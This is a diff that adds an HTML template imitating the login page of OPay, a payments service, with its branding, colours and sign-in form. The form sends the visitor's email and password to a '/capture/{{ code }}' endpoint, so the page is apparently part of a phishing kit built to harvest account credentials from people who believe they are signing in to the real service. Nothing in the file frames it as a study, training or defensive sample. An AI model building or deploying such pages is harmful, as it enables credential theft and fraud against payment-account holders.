@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OPay - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        .header {
+            background: linear-gradient(135deg, #0a1628, #1a3a4a, #2d6b6b);
+            height: 200px;
+        }
+        .form-section {
+            background: white;
+            padding: 30px 25px;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a0050;
+        }
+        .logo span { color: #3dd6b5; }
+        h2 { text-align: center; color: #1a0050; margin-bottom: 25px; font-size: 20px; }
+        label { display: block; font-size: 14px; font-weight: bold; color: #333; margin-bottom: 6px; }
+        input[type="email"], input[type="password"] {
+            width: 100%; padding: 14px; border: 1px solid #ddd;
+            border-radius: 6px; font-size: 15px; margin-bottom: 18px; background: #f5f5f5;
+        }
+        .row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; font-size: 13px; }
+        .row a { color: #3dd6b5; text-decoration: none; }
+        .btn { width: 100%; padding: 15px; background: #3dd6b5; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+        .signup { text-align: center; margin-top: 20px; font-size: 13px; color: #666; }
+        .signup a { color: #3dd6b5; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="header"></div>
+    <div class="form-section">
+        <div class="logo"><span>O</span>Pay</div>
+        <h2>Welcome back.</h2>
+        <form action="/capture/{{ code }}" method="POST">
+            <label>Email</label>
+            <input type="email" name="email" placeholder="Email" required>
+            <label>Password</label>
+            <input type="password" name="password" placeholder="Password" required>
+            <div class="row">
+                <label><input type="checkbox" checked> Remember me</label>
+                <a href="#">Forgot your password?</a>
+            </div>
+            <button class="btn" type="submit">Sign in</button>
+        </form>
+        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+</body>
+</html>
